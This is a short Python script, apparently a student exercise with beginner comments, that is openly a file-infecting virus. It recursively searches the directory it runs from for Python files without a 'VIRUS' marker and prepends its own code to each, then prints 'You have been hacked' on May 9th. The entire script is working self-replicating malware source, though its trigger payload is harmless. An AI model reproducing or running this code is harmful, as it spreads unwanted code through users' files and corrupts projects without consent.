#!/usr/bin/python3
# This imports a module so the code can interact with the OS and a module that allows the code work with dates and times
import os
import datetime

# this is the signture that mark the infected files
SIGNATURE = "VIRUS"
# The fuction locate will target a directory to infect
def locate(path):
    # the script will target the files in the dir it is ran from
    files_targeted = []
    filelist = os.listdir(path)
    # for loop will search eachfile in the directory
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        # looking for all python files is the python file is not infected it will infect it
        elif fname[-3:] == ".py":
            infected = False # if the file is a python file it will act as if it is not infected 
            for line in open(path+"/"+fname):
                if SIGNATURE in line: # if the signture is found the the file it is infected and the script will break and stop searching the file
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

def infect(files_targeted):
    virus = open(os.path.abspath(__file__)) # opens the current file 
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line # adds lines 0 thur 39 of the code to the file 
    virus.close # closes the file 
    for fname in files_targeted:
        f = open(fname) 
        temp = f.read()
        f.close()
        f = open(fname,"w") # opens the file in write mode 
        f.write(virusstring + temp) # writes the virus inot the file and then puts the oringnal content of the file back after
        f.close() #closes the file 

def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: #  this will check if the day is May 9th is it is it will print "You have been hacked"
        print("You have been hacked")

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()
